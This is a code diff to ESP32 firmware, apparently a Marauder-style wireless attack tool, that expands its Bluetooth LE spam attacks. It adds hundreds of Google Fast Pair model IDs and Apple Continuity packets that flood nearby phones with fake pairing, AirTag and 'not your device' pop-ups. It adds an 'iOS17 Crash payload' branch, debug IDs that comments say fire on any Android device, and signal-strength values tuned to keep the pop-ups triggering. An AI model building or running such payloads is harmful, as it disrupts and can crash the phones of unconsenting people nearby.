@@ -1,4 +1,5 @@
 #include "esp_random.h"
+#include "esp_bt.h"
 #include "WiFiScan.h"
 #include "lang_var.h"
 
@@ -45,6 +46,72 @@ extern "C" {
 }
 
 #ifdef HAS_BT
+// FastPair Device Model IDs from simondankelmann/Bluetooth-LE-Spam (484 devices)
+static const uint8_t g_fastpair_models[][3] = {
+  {0xDA,0xE0,0x96}, {0xA8,0x3C,0x10}, {0x00,0x20,0x00}, {0x9B,0x73,0x39}, {0x20,0x2B,0x3D}, {0x07,0x00,0x00}, {0x47,0x00,0x00}, {0x02,0xD8,0x15},
+  {0x1E,0xE8,0x90}, {0xE6,0xE7,0x71}, {0xCA,0xB6,0xB8}, {0x9C,0x39,0x97}, {0x99,0x39,0xBC}, {0xD7,0x10,0x2F}, {0xCA,0x70,0x30}, {0x05,0xAA,0x91},
+  {0x91,0xAA,0x05}, {0x03,0xAA,0x91}, {0x91,0xAA,0x03}, {0x02,0xAA,0x91}, {0x91,0xAA,0x02}, {0x03,0x8F,0x16}, {0x00,0xAA,0x91}, {0x91,0xAA,0x00},
+  {0xD6,0xE8,0x70}, {0x04,0xAA,0x91}, {0x91,0xAA,0x04}, {0x01,0xAA,0x91}, {0x91,0xAA,0x01}, {0x10,0x92,0x01}, {0xDF,0x27,0x1C}, {0x53,0x20,0x11},
+  {0xDA,0x52,0x00}, {0x00,0x52,0xDA}, {0x12,0x43,0x66}, {0x8D,0x13,0xB9}, {0x00,0xA1,0x68}, {0x1F,0x58,0x65}, {0x64,0x16,0x30}, {0x8E,0x55,0x50},
+  {0x21,0x52,0x1D}, {0xCD,0x82,0x56}, {0xA7,0xE5,0x2B}, {0xCD,0x82,0x56}, {0xDF,0x9B,0xA4}, {0x5B,0xAC,0xD6}, {0x8A,0x31,0xB7}, {0x00,0x00,0xF0},
+  {0xF0,0x00,0x00}, {0xF0,0x00,0x01}, {0x01,0x00,0xF0}, {0xF0,0x00,0x00}, {0xDA,0xDE,0x43}, {0x01,0x3D,0x8A}, {0x8A,0x3D,0x01}, {0x8A,0x3D,0x00},
+  {0x00,0x3D,0x8A}, {0x00,0x3D,0x8A}, {0xD7,0xE3,0xEB}, {0x0F,0x09,0x93}, {0x03,0x8B,0x91}, {0x21,0x3C,0x8C}, {0xDE,0xE8,0xC0}, {0x9C,0xE3,0xC7},
+  {0x99,0x43,0x74}, {0x0D,0xEC,0x2B}, {0xC7,0xA2,0x67}, {0x48,0x00,0x00}, {0x49,0x00,0x00}, {0x00,0x00,0x49}, {0x5C,0xEE,0x3C}, {0x08,0x00,0x00},
+  {0x91,0x5C,0xFA}, {0x89,0xBA,0xD5}, {0x8E,0x19,0x96}, {0xA8,0xCA,0xAD}, {0x8D,0x16,0xEA}, {0x9D,0x7D,0x42}, {0xE4,0xE4,0x57}, {0x06,0xAE,0x20},
+  {0x99,0xF0,0x98}, {0x8C,0x42,0x36}, {0x0B,0x00,0x00}, {0x0C,0x00,0x00}, {0x00,0x00,0x0C}, {0x00,0x00,0x06}, {0x06,0x00,0x00}, {0x00,0x00,0x06},
+  {0x06,0x00,0x00}, {0x9B,0x98,0x72}, {0xDA,0xD3,0xA6}, {0x00,0xAA,0x48}, {0x1F,0x2E,0x13}, {0x1F,0x45,0x89}, {0x91,0x01,0xF0}, {0x6B,0xA5,0xC3},
+  {0x8C,0x07,0xD2}, {0xDA,0x45,0x77}, {0x8B,0x0A,0x91}, {0xD5,0xA5,0x9E}, {0x91,0x71,0xBE}, {0xC7,0x9B,0x91}, {0xE7,0x50,0xCE}, {0xC8,0x77,0x7E},
+  {0xCA,0xF5,0x11}, {0xF5,0x24,0x94}, {0xA8,0x00,0x1A}, {0xA7,0xEF,0x76}, {0xD9,0x33,0xA7}, {0xC8,0x5D,0x7A}, {0xA8,0xF9,0x6D}, {0x00,0x02,0xF0},
+  {0xF0,0x02,0x01}, {0xF0,0x02,0x00}, {0xF0,0x02,0x02}, {0x01,0x02,0xF0}, {0x02,0x02,0xF0}, {0x01,0x02,0xF0}, {0x02,0x02,0xF0}, {0xF0,0x02,0x04},
+  {0xF0,0x02,0x05}, {0xF0,0x02,0x06}, {0xF0,0x02,0x03}, {0x06,0x02,0xF0}, {0x03,0x02,0xF0}, {0x04,0x02,0xF0}, {0x05,0x02,0xF0}, {0x03,0x02,0xF0},
+  {0x04,0x02,0xF0}, {0x05,0x02,0xF0}, {0xF0,0x02,0x08}, {0xF0,0x02,0x07}, {0x07,0x02,0xF0}, {0x08,0x02,0xF0}, {0x07,0x02,0xF0}, {0x08,0x02,0xF0},
+  {0x82,0x1F,0x66}, {0x07,0x1C,0x74}, {0x5B,0xE3,0xD4}, {0x71,0x8F,0xA4}, {0x02,0xF6,0x37}, {0x6C,0x4D,0xE5}, {0x8C,0xB0,0x5C}, {0xC6,0x93,0x6A},
+  {0xF5,0x24,0x94}, {0x05,0xC4,0x52}, {0x5C,0x8A,0xA5}, {0xA9,0x03,0x58}, {0x71,0x8F,0xA4}, {0xF0,0x02,0x09}, {0xF0,0x02,0x0A}, {0xF0,0x02,0x0B},
+  {0xF0,0x02,0x0C}, {0xF0,0x02,0x0D}, {0xF0,0x02,0x0F}, {0xF0,0x02,0x0E}, {0xF0,0x02,0x12}, {0xF0,0x02,0x11}, {0xF0,0x02,0x10}, {0xF0,0x02,0x13},
+  {0xF0,0x02,0x14}, {0xF0,0x02,0x15}, {0xA8,0xA7,0x2A}, {0x06,0x60,0xD7}, {0xC7,0xD6,0x20}, {0xDF,0xD4,0x33}, {0xE6,0x98,0x77}, {0x02,0xD8,0x86},
+  {0x1F,0xF8,0xFA}, {0xDC,0xF3,0x3C}, {0x9B,0x73,0x5A}, {0xD9,0x41,0x4F}, {0x66,0x44,0x54}, {0x04,0xAF,0xB8}, {0xA8,0xE3,0x53}, {0xE0,0x91,0x72},
+  {0x0F,0x23,0x2A}, {0x05,0x4B,0x2D}, {0xD9,0x7E,0xBA}, {0x5B,0xD6,0xC9}, {0x5C,0x0C,0x84}, {0x9B,0xC6,0x4D}, {0x9C,0x98,0xDB}, {0xA9,0x39,0x4A},
+  {0xA8,0xC6,0x36}, {0xCC,0x5F,0x29}, {0xD9,0x96,0x4B}, {0x03,0x8C,0xC7}, {0x02,0xDD,0x4F}, {0x91,0xC8,0x13}, {0xF0,0x0E,0x97}, {0x0F,0x1B,0x8D},
+  {0x9C,0x0A,0xF7}, {0xC7,0xFB,0xCC}, {0x04,0xAC,0xFC}, {0xE6,0x46,0x13}, {0xA9,0x24,0x98}, {0x54,0x95,0x47}, {0x1E,0xD9,0xF9}, {0x9C,0x40,0x58},
+  {0xC9,0x83,0x6A}, {0xD6,0x54,0xCD}, {0x9C,0xF0,0x8F}, {0x8A,0xAD,0xAE}, {0x8C,0xAD,0x81}, {0xF0,0x03,0x04}, {0x04,0x03,0xF0}, {0xF0,0x03,0x07},
+  {0x07,0x03,0xF0}, {0xF0,0x03,0x08}, {0x08,0x03,0xF0}, {0xF0,0x03,0x05}, {0x05,0x03,0xF0}, {0xF0,0x03,0x06}, {0x06,0x03,0xF0}, {0xF0,0x03,0x09},
+  {0x09,0x03,0xF0}, {0xF0,0x03,0x02}, {0x02,0x03,0xF0}, {0xF0,0x03,0x01}, {0x01,0x03,0xF0}, {0x00,0x03,0xF0}, {0xF0,0x03,0x00}, {0xF0,0x03,0x03},
+  {0x03,0x03,0xF0}, {0x91,0xBD,0x38}, {0x9A,0xEE,0xA4}, {0xD6,0xC1,0x95}, {0x9C,0xD0,0xF3}, {0x5C,0x4A,0x7E}, {0xDB,0x8A,0xC7}, {0x92,0x25,0x5E},
+  {0x62,0x57,0x40}, {0x8E,0x14,0xD7}, {0x00,0x30,0x00}, {0x00,0x30,0x01}, {0x00,0x30,0x01}, {0x91,0x7E,0x46}, {0x86,0x16,0x98}, {0x1F,0x18,0x1A},
+  {0x9C,0x6B,0xC0}, {0xC8,0x16,0x2A}, {0xE0,0x61,0x16}, {0x00,0x3B,0x41}, {0x05,0x0F,0x0C}, {0x03,0x9F,0x8F}, {0xCC,0xBB,0x7E}, {0x05,0x2C,0xC7},
+  {0xD8,0x05,0x8C}, {0x59,0x60,0x07}, {0x9A,0x40,0x8A}, {0x03,0xC9,0x9C}, {0xD5,0xB5,0xF7}, {0x0D,0xC6,0xBF}, {0x07,0xF4,0x26}, {0x01,0x12,0x42},
+  {0x85,0x53,0x47}, {0xA8,0xA0,0x0E}, {0x6B,0x93,0x04}, {0x8B,0xB0,0xA0}, {0x8E,0x46,0x66}, {0xE5,0x73,0x63}, {0x8B,0xF7,0x9A}, {0xE0,0x76,0x34},
+  {0x06,0xC1,0x97}, {0xDD,0x4E,0xC0}, {0x6B,0x8C,0x65}, {0xA8,0x84,0x5A}, {0x21,0xA0,0x4E}, {0x61,0x41,0x99}, {0x99,0xD7,0xEA}, {0x00,0x5B,0xC3},
+  {0xD6,0x5F,0x4E}, {0xC7,0x73,0x6C}, {0x0E,0xCE,0x95}, {0x00,0xFA,0x72}, {0x8D,0x5B,0x67}, {0x92,0xBB,0xBD}, {0x05,0x82,0xFD}, {0x6B,0x1C,0x64},
+  {0x8B,0x66,0xAB}, {0x9A,0xDB,0x11}, {0xC8,0xE2,0x28}, {0xD8,0x7A,0x3E}, {0x56,0x76,0x79}, {0x03,0x57,0x54}, {0x04,0x57,0x54}, {0x28,0x45,0x00},
+  {0x03,0x57,0x64}, {0x04,0x57,0x64}, {0xE6,0xE8,0xB8}, {0x0E,0x30,0xC3}, {0x72,0xEF,0x8D}, {0xE6,0xE3,0x7E}, {0x8C,0x6B,0x6A}, {0x8C,0xD1,0x0F},
+  {0xD8,0xF4,0xE8}, {0xD5,0xC6,0xCE}, {0xD6,0xEE,0x84}, {0xA8,0x65,0x8F}, {0x98,0x9D,0x0A}, {0xE6,0x4C,0xC6}, {0x00,0xC9,0x5C}, {0x01,0xC9,0x5C},
+  {0x5C,0xC9,0x00}, {0x5C,0xC9,0x01}, {0x5C,0xC9,0x38}, {0x5C,0xC9,0x39}, {0x5C,0xC9,0x3A}, {0x5C,0xC9,0x3B}, {0x2D,0x7A,0x23}, {0x1E,0xC9,0x5C},
+  {0x1F,0xC9,0x5C}, {0x20,0xC9,0x5C}, {0x5C,0xC9,0x1E}, {0x5C,0xC9,0x1F}, {0x5C,0xC9,0x20}, {0x5C,0xC9,0x21}, {0x5C,0xC9,0x22}, {0x5C,0xC9,0x23},
+  {0x5C,0xC9,0x24}, {0x5C,0xC9,0x25}, {0x5C,0xC9,0x26}, {0x5C,0xC9,0x27}, {0x02,0xC9,0x5C}, {0x03,0xC9,0x5C}, {0x06,0xC9,0x5C}, {0x07,0xC9,0x5C},
+  {0x5C,0xC9,0x02}, {0x5C,0xC9,0x03}, {0x5C,0xC9,0x06}, {0x5C,0xC9,0x07}, {0x0D,0xC9,0x5C}, {0x5C,0xC9,0x0A}, {0x5C,0xC9,0x0B}, {0x5C,0xC9,0x0C},
+  {0x5C,0xC9,0x0D}, {0x70,0x69,0x08}, {0x83,0x79,0x80}, {0x5C,0xC9,0x32}, {0x5C,0xC9,0x33}, {0x5C,0xC9,0x34}, {0x5C,0xC9,0x35}, {0x5C,0xC9,0x36},
+  {0x5C,0xC9,0x37}, {0x5C,0xC9,0x28}, {0x5C,0xC9,0x29}, {0x5C,0xC9,0x2A}, {0x5C,0xC9,0x2B}, {0x5C,0xC9,0x2C}, {0x5C,0xC9,0x2D}, {0x5C,0xC9,0x2E},
+  {0x5C,0xC9,0x2F}, {0x5C,0xC9,0x30}, {0x5C,0xC9,0x31}, {0x5C,0xC9,0x3C}, {0x5C,0xC9,0x3D}, {0x5C,0xC9,0x3E}, {0x5C,0xC9,0x3F}, {0x5C,0xC9,0x40},
+  {0x5C,0xC9,0x41}, {0x5C,0xC9,0x42}, {0x5C,0xC9,0x43}, {0x5C,0xC9,0x44}, {0x5C,0xC9,0x45}, {0x05,0xC9,0x5C}, {0x04,0xC9,0x5C}, {0x5C,0xC9,0x04},
+  {0x5C,0xC9,0x05}, {0x5C,0xC9,0x08}, {0x5C,0xC9,0x09}, {0x57,0x58,0x36}, {0x64,0x13,0x72}, {0x0E,0xC9,0x5C}, {0x5C,0xC9,0x0E}, {0x5C,0xC9,0x0F},
+  {0x5C,0xC9,0x10}, {0x5C,0xC9,0x11}, {0x5C,0xC9,0x12}, {0x5C,0xC9,0x13}, {0x5C,0xC9,0x14}, {0x5C,0xC9,0x15}, {0x5C,0xC9,0x16}, {0x5C,0xC9,0x17},
+  {0x5C,0xC9,0x18}, {0x5C,0xC9,0x19}, {0x5C,0xC9,0x1A}, {0x5C,0xC9,0x1B}, {0x5C,0xC9,0x1C}, {0x5C,0xC9,0x1D}, {0xD4,0x46,0xA7}, {0xCB,0x52,0x9D},
+  {0x00,0x8F,0x7D}, {0x06,0xD8,0xFC}, {0x9C,0xB8,0x81}, {0xE0,0x20,0xC1}, {0xCB,0x2F,0xE7}, {0xDE,0xDD,0x6F}, {0x72,0xFB,0x00}, {0xDA,0x0F,0x83},
+  {0xDF,0x4B,0x02}, {0x20,0x33,0x0C}, {0x91,0xDA,0xBC}, {0xE5,0xB9,0x1B}, {0x1E,0x8B,0x18}, {0x20,0xCC,0x2C}, {0xC6,0xEC,0x5F}, {0x1F,0x46,0x27},
+  {0x9C,0xEF,0xD1}, {0xC8,0x78,0xAA}, {0x20,0x1C,0x7C}, {0xDE,0xC0,0x4C}, {0xE5,0x7B,0x57}, {0xCC,0x93,0xA5}, {0xDF,0x01,0xE3}, {0xDF,0x42,0xDE},
+  {0x1F,0x11,0x01}, {0xE5,0x44,0x0B}, {0x91,0x28,0xCB}, {0x02,0xE2,0xA9}, {0x5C,0x55,0xE7}, {0x07,0x44,0xB6}, {0x0A,0x00,0x00}, {0x00,0x00,0x0A},
+  {0x35,0x00,0x00}, {0x09,0x00,0x00}, {0xDE,0x57,0x7F}, {0x1E,0xED,0xF5}, {0x6A,0xD2,0x26}, {0x8B,0x5A,0x7B}, {0x05,0x78,0x02}, {0xD6,0x9B,0x2B},
+  {0x1F,0xE7,0x65}, {0x6C,0x42,0xC0}, {0x99,0x7B,0x4A}, {0xC6,0xAB,0xEA}, {0x5C,0x02,0x06}, {0x9D,0x00,0xA6}, {0xCB,0x09,0x3B}, {0x2D,0x7A,0x23},
+  {0xC8,0xD3,0x35}, {0xC9,0x18,0x6B}, {0xDB,0xE5,0xB1}, {0x8A,0x8F,0x23}, {0xE5,0xB4,0xB0}, {0xDE,0x21,0x5D}, {0x1F,0xBB,0x50}, {0x07,0xA4,0x1C},
+  {0xC6,0x9A,0xFD}, {0x0E,0x13,0x8D}, {0x20,0xA1,0x9B}, {0x5B,0xA9,0xB5}, {0xA8,0x8B,0x69}, {0x01,0xEE,0xB4}, {0x05,0x8D,0x08}, {0xCC,0x43,0x8E},
+  {0x12,0x66,0x44}, {0x5C,0x7C,0xDC}, {0x9C,0xB5,0xF3}, {0xD4,0x46,0xA7}, {0xD8,0xF3,0xBA}, {0x0F,0x2D,0x16}, {0x5C,0x48,0x33}, {0x99,0xC8,0x7B},
+  {0xDC,0x52,0x49}, {0xDE,0xF2,0x34}, {0x9C,0x88,0x8B}, {0x9A,0x9B,0xDD}, {0xD8,0x20,0xEA}, {0x1E,0x95,0x5B}, {0x9B,0xE9,0x31}, {0x05,0xA9,0x63},
+  {0x03,0xF5,0xD4}, {0xDE,0xEA,0x86}, {0xD9,0x06,0x17}, {0xC8,0xC6,0x41}, {0x61,0x29,0x07}, {0x91,0x3B,0x0C}, {0x9D,0xB8,0x96}, {0x03,0xB7,0x16},
+  {0x9C,0xA2,0x77}, {0xCC,0x75,0x4F}, {0x8C,0x17,0x06}, {0xE5,0xE2,0xE9}
+};
+static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
+
   //ESP32 Sour Apple by RapierXbox
   //Exploit by ECTO-1A
   NimBLEAdvertising *pAdvertising;
@@ -84,30 +151,33 @@ extern "C" {
         #endif
         break;
       }
-      case Apple: { // Actions
-        if (random(10) > 0) {
+      case Apple: {
+        // Randomly pick one of 5 Apple Continuity sub-formats
+        // Matches simondankelmann/Bluetooth-LE-Spam Android app behavior
+        uint8_t apple_r = random(10);
+        if (apple_r < 4) {
+          // --- ContinuityAction (Modal popup) ---
+          const uint8_t action_types[] = {
+            0x13, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B,
+            0x01, 0x06, 0x0D, 0x2B, 0x05, 0x24, 0x2F, 0x21
+          };
+          uint8_t act = action_types[rand() % sizeof(action_types)];
+          uint8_t aflag = 0xC0;
+          if (act == 0x21) aflag = 0x40;
+          else if (act == 0x20 && (random(2) == 0)) aflag = 0xBF;
+          else if (act == 0x09 && (random(2) == 0)) aflag = 0x40;
           AdvData_Raw = new uint8_t[11];
-
-          AdvData_Raw[i++] = 0x0A;    // Packet Length
-          AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
-          AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
-          AdvData_Raw[i++] = 0x00;        // ...
-          AdvData_Raw[i++] = 0x0F;  // Type
-          AdvData_Raw[i++] = 0x05;                        // Length
-          AdvData_Raw[i++] = 0xC0;                        // Action Flags
-
-          const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
-          AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
-
+          AdvData_Raw[i++] = 0x0A;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x4C;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x0F;
+          AdvData_Raw[i++] = 0x05;
+          AdvData_Raw[i++] = aflag;
+          AdvData_Raw[i++] = act;
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
-          //i += 3;   
-          //AdvData_Raw[i++] = 0x00;  // ???
-          //AdvData_Raw[i++] = 0x00;  // ???
-          //AdvData_Raw[i++] =  0x10;  // Type ???
-          //esp_fill_random(&AdvData_Raw[i], 3);
-
           #ifndef HAS_NIMBLE_2
             AdvData.addData(std::string((char *)AdvData_Raw, 11));
           #else
@@ -115,37 +185,129 @@ extern "C" {
           #endif
           break;
         }
-        else { // Devices
-          AdvData_Raw = new uint8_t[21];
-          AdvData_Raw[i++] = 0x14;
+        else if (apple_r < 6) {
+          // --- NotYourDevice (prefix=0x01, simondankelmann parity) ---
+          const uint16_t notyour_types[] = {
+            0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420,
+            0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120,
+            0x0520, 0x0920, 0x1720, 0x1220, 0x1620
+          };
+          uint16_t ntype = notyour_types[rand() % (sizeof(notyour_types) / sizeof(notyour_types[0]))];
+          AdvData_Raw = new uint8_t[31];
+          AdvData_Raw[i++] = 0x1E;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x4C;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x07;  // ProximityPair
+          AdvData_Raw[i++] = 0x19;  // payload size = 25
+          AdvData_Raw[i++] = 0x01;  // prefix = NOT YOUR DEVICE
+          AdvData_Raw[i++] = (uint8_t)((ntype >> 8) & 0xFF);
+          AdvData_Raw[i++] = (uint8_t)(ntype & 0xFF);
+          AdvData_Raw[i++] = 0x55;                  // status
+          AdvData_Raw[i++] = (uint8_t)random(256);  // buds battery
+          AdvData_Raw[i++] = (uint8_t)random(256);  // case battery
+          AdvData_Raw[i++] = (uint8_t)random(256);  // lid open count
+          AdvData_Raw[i++] = 0x00;                  // color
+          AdvData_Raw[i++] = 0x00;
+          for (int k = 0; k < 16; k++) AdvData_Raw[i++] = (uint8_t)random(256);
+          #ifndef HAS_NIMBLE_2
+            AdvData.addData(std::string((char *)AdvData_Raw, 31));
+          #else
+            AdvData.addData(AdvData_Raw, 31);
+          #endif
+          break;
+        }
+        else if (apple_r < 8) {
+          // --- NewDevicePopUp (AirPods / Beats pairing UI) ---
+          AdvData_Raw = new uint8_t[31];
+          AdvData_Raw[i++] = 0x1E;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x4C;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x07;  // ProximityPair
+          AdvData_Raw[i++] = 0x19;  // payload length = 25
+          AdvData_Raw[i++] = 0x07;  // NewDevicePopUp prefix
+          // Expanded AirPods / Beats / Solo3 / Powerbeats product IDs
+          const uint16_t dev_types[] = {
+            0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420, 0x1020, 0x0620, 0x0320,
+            0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920, 0x1720, 0x1220, 0x1620,
+            0x1820, 0x1920, 0x1A20, 0x1B20, 0x1C20, 0x1D20, 0x1E20, 0x1F20,
+            0x0720, 0x0820, 0x0D20, 0x0420, 0x0120, 0x2420, 0x2520
+          };
+          uint16_t dtype = dev_types[rand() % (sizeof(dev_types) / sizeof(dev_types[0]))];
+          AdvData_Raw[i++] = (uint8_t)((dtype >> 8) & 0xFF);
+          AdvData_Raw[i++] = (uint8_t)(dtype & 0xFF);
+          AdvData_Raw[i++] = 0x55;                        // status
+          AdvData_Raw[i++] = (uint8_t)random(256);        // buds battery
+          AdvData_Raw[i++] = (uint8_t)random(256);        // case battery
+          AdvData_Raw[i++] = (uint8_t)random(256);        // lid open count
+          AdvData_Raw[i++] = 0x00;                        // color (white)
+          AdvData_Raw[i++] = 0x00;
+          for (int k = 0; k < 16; k++) AdvData_Raw[i++] = (uint8_t)random(256);
+          #ifndef HAS_NIMBLE_2
+            AdvData.addData(std::string((char *)AdvData_Raw, 31));
+          #else
+            AdvData.addData(AdvData_Raw, 31);
+          #endif
+          break;
+        }
+        else if (apple_r == 8) {
+          // --- NewAirtagPopUp (AirTag / Hermes AirTag) ---
+          AdvData_Raw = new uint8_t[31];
+          AdvData_Raw[i++] = 0x1E;
           AdvData_Raw[i++] = 0xFF;
           AdvData_Raw[i++] = 0x4C;
           AdvData_Raw[i++] = 0x00;
           AdvData_Raw[i++] = 0x07;
-          AdvData_Raw[i++] = 0x0F;
-          AdvData_Raw[i++] = 0x00;
-          const uint16_t types[] = {0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20, 0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620};
-          uint16_t type = types[rand() % (sizeof(types) / sizeof(types[0]))];
-          AdvData_Raw[i++] = (uint8_t)((type >> 0x08) & 0xFF);
-          AdvData_Raw[i++] = (uint8_t)((type >> 0x00) & 0xFF);
-
-          AdvData_Raw[i++] = 0xAC;
-          AdvData_Raw[i++] = 0x90;
-          AdvData_Raw[i++] = 0x85;
-          AdvData_Raw[i++] = 0x75;
-          AdvData_Raw[i++] = 0x94;
-          AdvData_Raw[i++] = 0x65;
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = 0x19;
+          AdvData_Raw[i++] = 0x05;  // NewAirtagPopUp prefix
+          const uint16_t airtag_types[] = {0x0055, 0x0030};
+          uint16_t atype = airtag_types[rand() % 2];
+          AdvData_Raw[i++] = (uint8_t)((atype >> 8) & 0xFF);
+          AdvData_Raw[i++] = (uint8_t)(atype & 0xFF);
+          AdvData_Raw[i++] = 0x55;
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = 0x00;
-
+          AdvData_Raw[i++] = 0x00;
+          for (int k = 0; k < 16; k++) AdvData_Raw[i++] = (uint8_t)random(256);
           #ifndef HAS_NIMBLE_2
-            AdvData.addData(std::string((char *)AdvData_Raw, 21));
+            AdvData.addData(std::string((char *)AdvData_Raw, 31));
           #else
-            AdvData.addData(AdvData_Raw, 21);
+            AdvData.addData(AdvData_Raw, 31);
+          #endif
+          break;
+        }
+        else {
+          // --- iOS17 Crash payload (NearbyAction with special flags) ---
+          AdvData_Raw = new uint8_t[17];
+          AdvData_Raw[i++] = 0x10;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x4C;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x0F;  // NearbyAction
+          AdvData_Raw[i++] = 0x05;  // payload length
+          const uint8_t crash_actions[] = { 0x13, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B };
+          uint8_t cact = crash_actions[rand() % sizeof(crash_actions)];
+          uint8_t cflag = 0xC0;
+          if (cact == 0x20) cflag = 0xBF;
+          else if (cact == 0x09 && (random(2) == 0)) cflag = 0x40;
+          AdvData_Raw[i++] = cflag;
+          AdvData_Raw[i++] = cact;
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x10;
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          #ifndef HAS_NIMBLE_2
+            AdvData.addData(std::string((char *)AdvData_Raw, 17));
+          #else
+            AdvData.addData(AdvData_Raw, 17);
           #endif
           break;
         }
@@ -154,7 +316,7 @@ extern "C" {
 
         AdvData_Raw = new uint8_t[15];
 
-        uint8_t model = watch_models[rand() % 25].value;
+        uint8_t model = watch_models[rand() % 26].value;
         
         AdvData_Raw[i++] = 14; // Size
         AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
@@ -182,6 +344,34 @@ extern "C" {
       }
       case Google: {
         AdvData_Raw = new uint8_t[14];
+        uint8_t mid0, mid1, mid2;
+        // Google-approved debug/test model IDs trigger popup on ALL Android devices
+        // (no Developer Mode required), unlike unregistered IDs.
+        static const uint8_t fp_debug[][3] = {
+          {0x08,0x00,0x00}, // Foocorp Foophones
+          {0x09,0x00,0x00}, // Test Android TV
+          {0x0A,0x00,0x00}, // Test Anti-Spoofing
+          {0x0A,0x00,0x7F}, // FastPair Debug Mode
+          {0x0B,0x00,0x00}, // Google Gphones
+          {0x0C,0x00,0x00}, // Google Gphones
+          {0x35,0x00,0x00}, // Test 000035
+          {0x47,0x00,0x00}, // Arduino 101
+          {0x48,0x00,0x00}, // Fast Pair Headphones
+          {0x49,0x00,0x00}, // Fast Pair Headphones
+        };
+        static const uint8_t fp_debug_count = sizeof(fp_debug) / 3;
+        // 60% debug IDs (trigger on any Android), 40% genuine registered IDs
+        if ((rand() % 10) < 6) {
+          uint8_t di = rand() % fp_debug_count;
+          mid0 = fp_debug[di][0];
+          mid1 = fp_debug[di][1];
+          mid2 = fp_debug[di][2];
+        } else {
+          uint16_t fp_idx = random(g_fastpair_count);
+          mid0 = g_fastpair_models[fp_idx][0];
+          mid1 = g_fastpair_models[fp_idx][1];
+          mid2 = g_fastpair_models[fp_idx][2];
+        }
         AdvData_Raw[i++] = 3;
         AdvData_Raw[i++] = 0x03;
         AdvData_Raw[i++] = 0x2C; // Fast Pair ID
@@ -191,13 +381,17 @@ extern "C" {
         AdvData_Raw[i++] = 0x16;
         AdvData_Raw[i++] = 0x2C; // Fast Pair ID
         AdvData_Raw[i++] = 0xFE;
-        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
-        AdvData_Raw[i++] = 0xB7;
-        AdvData_Raw[i++] = 0x27;
+        AdvData_Raw[i++] = mid0;
+        AdvData_Raw[i++] = mid1;
+        AdvData_Raw[i++] = mid2;
 
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
-        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+        // path_loss = adv_TxPower - RSSI. Typical RSSI at 1m ≈ -65 dBm.
+        // +9 dBm → path_loss 74 dBm → ~15m → popup suppressed.
+        // -60 dBm → path_loss 5 dBm → ~0.1m → popup always fires.
+        // Range -60..+5 covers close to medium-far while keeping most packets popup-eligible.
+        AdvData_Raw[i++] = (int8_t)(-60 + (rand() % 66)); // -60 .. +5 dBm
 
         #ifndef HAS_NIMBLE_2
           AdvData.addData(std::string((char *)AdvData_Raw, 14));
@@ -235,7 +429,7 @@ extern "C" {
 
         AdvData_Raw[i++] = 0x02;  // TX Power level length
         AdvData_Raw[i++] = 0x0A;  // TX Power level type
-        AdvData_Raw[i++] = 0x00;  // TX Power level value
+        AdvData_Raw[i++] = (int8_t)(-80 + (rand() % 41));  // fake "close" range -80..-40 dBm
 
         // Manufacturer specific data based on your hex dump
         AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
@@ -1887,22 +2081,28 @@ void WiFiScan::RunSetup() {
     mac_entry_state[i] = 0;
 
   #ifdef HAS_BT
-    watch_models = new WatchModel[20] {
+    watch_models = new WatchModel[26] {
       {0x1A, "Fallback Watch"},
+      {0x01, "White Watch4 Classic 44m"},
       {0x02, "Black Watch4 Classic 40m"},
       {0x03, "White Watch4 Classic 40m"},
+      {0x04, "Black Watch4 44mm"},
+      {0x05, "Silver Watch4 44mm"},
       {0x06, "Green Watch4 44mm"},
       {0x07, "Black Watch4 40mm"},
       {0x08, "White Watch4 40mm"},
       {0x09, "Gold Watch4 40mm"},
+      {0x0A, "French Watch4"},
       {0x0B, "French Watch4 Classic"},
       {0x0C, "Fox Watch5 44mm"},
       {0x11, "Black Watch5 44mm"},
